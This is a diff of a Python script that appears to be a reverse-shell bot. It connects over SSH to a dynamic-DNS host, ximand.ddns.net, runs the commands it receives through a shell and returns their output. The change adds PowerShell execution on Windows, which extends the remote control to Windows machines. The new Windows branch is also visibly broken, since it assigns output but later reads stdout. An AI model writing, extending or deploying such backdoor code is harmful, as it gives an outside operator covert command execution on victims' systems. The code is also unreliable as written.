@@ -17,7 +17,6 @@ import subprocess
 
 parent_dir = os.path.dirname(os.path.abspath(__file__))
 
-
 # Global variables to track SSH client and session
 ssh_client = None
 ssh_session = None
@@ -64,11 +63,21 @@ def exec_underlying_command(command):
     if isinstance(command, bytes):
         command = command.decode()
 
-    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = process.communicate()  # Get the output and errors if any
+    if os.name == 'nt':
+        process = subprocess.Popen(
+            ["powershell.exe", "-NoProfile", "-Command", command],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+            text=True
+        )
+        output, stderr = process.communicate()
+    else:
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
 
     result = None
-    if process.returncode == 0:  # Check if the command was successful
+    if process.returncode == 0:
         result = stdout.decode().strip()
     else:
         result = stderr.decode().strip()
@@ -156,7 +165,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             ssh_session.send(response.encode())
 
             return response
-
                 
         time.sleep(1)
 
@@ -170,7 +178,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
 if __name__ == "__main__":
 
-    #global user
     auth_path = os.path.join(parent_dir, 'mechanism')
     host = resolve_ip('ximand.ddns.net')
 
